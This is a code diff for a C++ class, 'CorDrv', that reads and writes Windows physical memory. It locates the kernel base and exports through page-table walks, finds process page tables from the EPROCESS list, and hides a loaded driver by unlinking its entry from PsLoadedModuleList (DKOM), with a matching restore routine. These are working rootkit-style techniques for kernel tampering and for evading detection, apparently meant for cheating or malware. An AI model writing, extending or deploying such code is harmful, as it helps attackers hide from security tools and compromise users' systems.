@@ -226,8 +226,8 @@ uint64_t CorDrv::FindSystemDTB() {
     if (TryFindDTBFromLowStub(lowStub, dtb, kernelEntry)) {
         delete[] lowStub;
         if (ValidatePML4Page(dtb, 0x8000000000ULL)) {
-            printf("dtb: 0x%llX\n", (unsigned long long)dtb);
             m_SystemDTB = dtb;
+            m_KernelEntryVA = kernelEntry;
             return dtb;
         }
         printf("dtb validation failed.\n");
@@ -238,40 +238,116 @@ uint64_t CorDrv::FindSystemDTB() {
     return 0;
 }
 
-uint64_t CorDrv::GetSystemEprocessVA() {
-    auto NtQuerySystemInformation = reinterpret_cast<PFN_NtQuerySystemInformation>(
-        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation")
-        );
-    if (!NtQuerySystemInformation)
+uint64_t CorDrv::FindNtoskrnlBaseViaPhys() {
+    if (!m_KernelEntryVA || !m_SystemDTB)
         return 0;
 
-    ULONG bufferLength = 0;
-    ULONG returnSize = 0;
-    void* buffer = malloc(1);
+    uint64_t base = m_KernelEntryVA & ~0xFFFULL;
+    for (uint32_t i = 0; i < 0x800; i++, base -= 0x1000) {
+        uint16_t magic = 0;
+        if (!ReadProcessMemory(m_SystemDTB, base, &magic, sizeof(magic)))
+            continue;
+        if (magic != IMAGE_DOS_SIGNATURE)
+            continue;
 
-    while (NtQuerySystemInformation(SystemExtendedHandleInformation, buffer, bufferLength, &returnSize) != 0) {
-        bufferLength = returnSize + 8192; 
-        free(buffer);
-        buffer = malloc(bufferLength);
-        if (!buffer) return 0;
-        returnSize = 0;
+        // Validate PE signature
+        uint32_t peOffset = 0;
+        if (!ReadProcessMemory(m_SystemDTB, base + 0x3C, &peOffset, sizeof(peOffset)))
+            continue;
+        if (peOffset == 0 || peOffset > 0x1000)
+            continue;
+
+        uint32_t peSig = 0;
+        if (!ReadProcessMemory(m_SystemDTB, base + peOffset, &peSig, sizeof(peSig)))
+            continue;
+        if (peSig != IMAGE_NT_SIGNATURE)
+            continue;
+
+        uint32_t sizeOfImage = 0;
+        ReadProcessMemory(m_SystemDTB, base + peOffset + 0x18 + 0x38, &sizeOfImage, 4);
+
+        if (sizeOfImage < 0x100000)
+            continue;
+
+        if (m_KernelEntryVA < base || m_KernelEntryVA >= base + sizeOfImage)
+            continue;
+
+        return base;
     }
+    return 0;
+}
 
-    auto* handleInfo = static_cast<SYSTEM_HANDLE_INFORMATION_EX*>(buffer);
-    uint64_t eprocess = 0;
+uint64_t CorDrv::ResolveKernelExportViaPhys(uint64_t NtBaseVA, const char* ExportName) {
+    if (!NtBaseVA || !m_SystemDTB)
+        return 0;
 
-    if (handleInfo) {
-        for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++) {
-            auto& h = handleInfo->Handles[i];
-            if (h.UniqueProcessId == 4 && h.HandleAttributes == 0x102A) {
-                eprocess = reinterpret_cast<uint64_t>(h.Object);
-                break;
-            }
+    uint32_t peOffset = 0;
+    if (!ReadProcessMemory(m_SystemDTB, NtBaseVA + 0x3C, &peOffset, sizeof(peOffset)))
+        return 0;
+
+    uint64_t exportDirEntryVA = NtBaseVA + peOffset + 0x18 + 0x70;
+    uint32_t exportRVA = 0, exportSize = 0;
+    if (!ReadProcessMemory(m_SystemDTB, exportDirEntryVA, &exportRVA, 4)) return 0;
+    if (!ReadProcessMemory(m_SystemDTB, exportDirEntryVA + 4, &exportSize, 4)) return 0;
+    if (!exportRVA || !exportSize) return 0;
+
+    uint64_t expDirVA = NtBaseVA + exportRVA;
+    uint32_t numberOfNames = 0, addrFunctions = 0, addrNames = 0, addrOrdinals = 0;
+    ReadProcessMemory(m_SystemDTB, expDirVA + 0x18, &numberOfNames, 4);
+    ReadProcessMemory(m_SystemDTB, expDirVA + 0x1C, &addrFunctions, 4);
+    ReadProcessMemory(m_SystemDTB, expDirVA + 0x20, &addrNames, 4);
+    ReadProcessMemory(m_SystemDTB, expDirVA + 0x24, &addrOrdinals, 4);
+
+    if (!numberOfNames || !addrFunctions || !addrNames || !addrOrdinals)
+        return 0;
+
+    for (uint32_t i = 0; i < numberOfNames; i++) {
+        uint32_t nameRVA = 0;
+        uint64_t nameEntryVA = NtBaseVA + addrNames + (uint64_t)i * 4;
+        if (!ReadProcessMemory(m_SystemDTB, nameEntryVA, &nameRVA, 4)) continue;
+
+        char symName[64] = {};
+        if (!ReadProcessMemory(m_SystemDTB, NtBaseVA + nameRVA, symName, sizeof(symName) - 1))
+            continue;
+
+        if (strcmp(symName, ExportName) == 0) {
+            uint16_t ordinal = 0;
+            uint64_t ordEntryVA = NtBaseVA + addrOrdinals + (uint64_t)i * 2;
+            if (!ReadProcessMemory(m_SystemDTB, ordEntryVA, &ordinal, 2)) return 0;
+
+            uint32_t funcRVA = 0;
+            uint64_t funcEntryVA = NtBaseVA + addrFunctions + (uint64_t)ordinal * 4;
+            if (!ReadProcessMemory(m_SystemDTB, funcEntryVA, &funcRVA, 4)) return 0;
+
+            return NtBaseVA + funcRVA;
         }
     }
+    return 0;
+}
 
-    free(buffer);
-    return eprocess;
+uint64_t CorDrv::GetSystemEprocessVA() {
+    if (!m_KernelEntryVA || !m_SystemDTB)
+        return 0;
+
+    uint64_t ntBase = FindNtoskrnlBaseViaPhys();
+    if (!ntBase) return 0;
+
+    uint64_t ptrVA = ResolveKernelExportViaPhys(ntBase, "PsInitialSystemProcess");
+    if (!ptrVA) return 0;
+
+    uint64_t ptrPhys = TranslateVirtualAddress(m_SystemDTB, ptrVA);
+    if (!ptrPhys) return 0;
+
+    uint64_t eproc = 0;
+    if (!ReadPhysicalMemory(ptrPhys, &eproc, sizeof(eproc)) || !eproc)
+        return 0;
+
+    uint64_t vPhys = TranslateVirtualAddress(m_SystemDTB, eproc);
+    if (!vPhys) return 0;
+
+    uint64_t pid = 0;
+    ReadPhysicalMemory(vPhys + EProcess::UniqueProcessId, &pid, sizeof(pid));
+    return (pid == 4) ? eproc : 0;
 }
 
 uint64_t CorDrv::TranslateVirtualAddress(uint64_t DTB, uint64_t VirtualAddress) {
@@ -318,7 +394,8 @@ uint64_t CorDrv::FindProcessDTB(DWORD Pid) {
         return 0;
 
     uint64_t firstFlink = 0;
-    ReadPhysicalMemory(listHeadPhys, &firstFlink, sizeof(firstFlink));
+    if (!ReadPhysicalMemory(listHeadPhys, &firstFlink, sizeof(firstFlink)) || firstFlink == 0)
+        return 0;
 
     uint64_t currentFlink = firstFlink;
     uint32_t count = 0;
@@ -329,26 +406,29 @@ uint64_t CorDrv::FindProcessDTB(DWORD Pid) {
         if (eprocessPhys == 0) break;
 
         uint64_t currentPid = 0;
-        ReadPhysicalMemory(eprocessPhys + EProcess::UniqueProcessId, &currentPid, sizeof(currentPid));
+        if (!ReadPhysicalMemory(eprocessPhys + EProcess::UniqueProcessId, &currentPid, sizeof(currentPid)))
+            break;
 
         if (currentPid == Pid) {
             uint64_t processDTB = 0;
-            ReadPhysicalMemory(eprocessPhys + EProcess::DirectoryTableBase, &processDTB, sizeof(processDTB));
-            return processDTB;
+            if (ReadPhysicalMemory(eprocessPhys + EProcess::DirectoryTableBase, &processDTB, sizeof(processDTB)))
+                return processDTB;
+            break;
         }
 
         uint64_t flinkPhys = TranslateVirtualAddress(m_SystemDTB, currentFlink);
         if (flinkPhys == 0) break;
 
         uint64_t nextFlink = 0;
-        ReadPhysicalMemory(flinkPhys, &nextFlink, sizeof(nextFlink));
+        if (!ReadPhysicalMemory(flinkPhys, &nextFlink, sizeof(nextFlink)))
+            break;
 
-        if (nextFlink == firstFlink || nextFlink == 0) break;
+        if (nextFlink == listHeadVA || nextFlink == 0)
+            break;
         currentFlink = nextFlink;
         count++;
     } while (count < 4096);
 
-    printf("pid %u not found\n", Pid);
     return 0;
 }
 
@@ -475,6 +555,7 @@ uint64_t CorDrv::ResolvePsLoadedModuleList(uint64_t NtBase, const char* NtName) 
     return result;
 }
 
+
 bool CorDrv::HideDriver(const wchar_t* DriverBaseName) {
     if (m_SystemDTB == 0) return false;
 
@@ -520,12 +601,10 @@ bool CorDrv::HideDriver(const wchar_t* DriverBaseName) {
             m_HiddenEntryFlink = entryFlink;
             m_HiddenEntryBlink = entryBlink;
 
-            // prev->Flink = entry->Flink
             uint64_t prevPhys = TranslateVirtualAddress(m_SystemDTB, entryBlink);
             if (!prevPhys) return false;
             WritePhysicalMemory(prevPhys + LdrEntry::InLoadOrderFlink, &entryFlink, sizeof(entryFlink));
 
-            // next->Blink = entry->Blink
             uint64_t nextPhys = TranslateVirtualAddress(m_SystemDTB, entryFlink);
             if (!nextPhys) return false;
             WritePhysicalMemory(nextPhys + LdrEntry::InLoadOrderBlink, &entryBlink, sizeof(entryBlink));
@@ -533,7 +612,6 @@ bool CorDrv::HideDriver(const wchar_t* DriverBaseName) {
             return true;
         }
 
-        // Advance to next entry via Flink
         uint64_t nextFlink = 0;
         ReadPhysicalMemory(entryPhys + LdrEntry::InLoadOrderFlink, &nextFlink, sizeof(nextFlink));
         if (!nextFlink || nextFlink == currentEntryVA) break;
@@ -546,13 +624,11 @@ bool CorDrv::RestoreDriver() {
     if (!m_SystemDTB || !m_HiddenEntryVA || !m_HiddenEntryFlink || !m_HiddenEntryBlink)
         return false;
 
-    // Restore prev->Flink
     uint64_t prevPhys = TranslateVirtualAddress(m_SystemDTB, m_HiddenEntryBlink);
     if (prevPhys) {
         WritePhysicalMemory(prevPhys + LdrEntry::InLoadOrderFlink, &m_HiddenEntryVA, sizeof(m_HiddenEntryVA));
     }
 
-    // Restore next->Blink
     uint64_t nextPhys = TranslateVirtualAddress(m_SystemDTB, m_HiddenEntryFlink);
     if (nextPhys) {
         WritePhysicalMemory(nextPhys + LdrEntry::InLoadOrderBlink, &m_HiddenEntryVA, sizeof(m_HiddenEntryVA));
